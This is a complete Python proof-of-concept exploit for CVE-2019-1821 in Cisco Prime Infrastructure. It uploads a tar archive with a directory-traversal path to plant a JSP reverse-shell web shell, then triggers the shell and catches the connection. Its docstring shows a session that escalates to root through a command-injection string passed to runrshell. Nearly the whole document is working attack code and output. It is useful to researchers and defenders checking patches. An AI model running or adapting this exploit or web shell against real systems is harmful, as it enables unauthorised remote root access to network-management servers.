#!/usr/bin/python

"""
Cisco Prime Infrastructure Health Monitor HA TarArchive Directory Traversal Remote Code Execution Vulnerability
Steven Seeley (mr_me) of Source Incite - 2019
SRC: SRC-2019-0034
CVE: CVE-2019-1821

Example:
========

saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.100.123 192.168.100.2:4444

saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.2:4444
(+) planted backdoor!
(+) starting handler on port 4444
(+) connection from 192.168.100.123
(+) pop thy shell!
python -c 'import pty; pty.spawn("/bin/bash")'
[prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
/opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
sh-4.1# /usr/bin/id
/usr/bin/id
uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
sh-4.1# exit
exit
exit
[prime@piconsole CSCOlumos]$ exit
exit
exit
"""

import sys
import socket
import requests
import tarfile
import telnetlib
from threading import Thread
from cStringIO import StringIO
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def _build_tar(ls, lp):
    """
    build the tar archive without touching disk
    """
    f = StringIO()
    b = _get_jsp(ls, lp)
    t = tarfile.TarInfo("../../opt/CSCOlumos/tomcat/webapps/ROOT/si.jsp")
    t.size = len(b)
    with tarfile.open(fileobj=f, mode="w") as tar:
        tar.addfile(t, StringIO(b))
    return f.getvalue()

def _get_jsp(ls, lp):
    jsp = """<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
  class StreamConnector extends Thread
  {
    InputStream sv;
    OutputStream tp;
    StreamConnector( InputStream sv, OutputStream tp )
    {
      this.sv = sv;
      this.tp = tp;
    }
    public void run()
    {
      BufferedReader za  = null;
      BufferedWriter hjr = null;
      try
      {
        za  = new BufferedReader( new InputStreamReader( this.sv ) );
        hjr = new BufferedWriter( new OutputStreamWriter( this.tp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hjr.write( buffer, 0, length );
          hjr.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( za != null )
          za.close();
        if( hjr != null )
          hjr.close();
      } catch( Exception e ){}
    }
  }
  try
  {
    String ShellPath = new String("/bin/sh");
    Socket socket = new Socket("__IP__", __PORT__);
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>"""
    return jsp.replace("__IP__", ls).replace("__PORT__", str(lp))

def handler(lp):
    """
    This is the client handler, to catch the connectback
    """
    print "(+) starting handler on port %d" % lp
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print  "(+) connection from %s" % addr[0]
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()

def exec_code(t, lp):
    """
    This function threads the client handler and sends off the attacking payload
    """
    handlerthr = Thread(target=handler, args=(lp,))
    handlerthr.start()
    r = requests.get("https://%s/si.jsp" % t, verify=False)

def we_can_upload(t, ls, lp):
    """
    This is where we take advantage of the vulnerability
    """
    td = _build_tar(ls, lp)
    bd = {'files': ('si.tar', td)}
    h = {
      'Destination-Dir': 'tftpRoot',
      'Compressed-Archive': "false",
      'Primary-IP' : '127.0.0.1',
      'Filecount' : "1",
      'Filename': "si.tar",
      'Filesize' : str(len(td)),
    }
    r = requests.post("https://%s:8082/servlet/UploadServlet" % t, headers=h, files=bd, verify=False)
    if r.status_code == 200:
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <connectback:port>" % sys.argv[0]
        print "(+) eg: %s 192.168.100.123 192.168.100.2:4444" % sys.argv[0]
        sys.exit(-1)
    t  = sys.argv[1]
    cb = sys.argv[2]
    if not ":" in cb:
        print "(+) using default connectback port 4444"
        ls = cb
        lp = 4444
    else:
        if not cb.split(":")[1].isdigit():
            print "(-) %s is not a port number!" % cb.split(":")[1]
            sys.exit(-1)
        ls = cb.split(":")[0]
        lp = int(cb.split(":")[1])
    if we_can_upload(t, ls, lp):
        print "(+) planted backdoor!"
        exec_code(t, lp)

if __name__ == '__main__':
    main()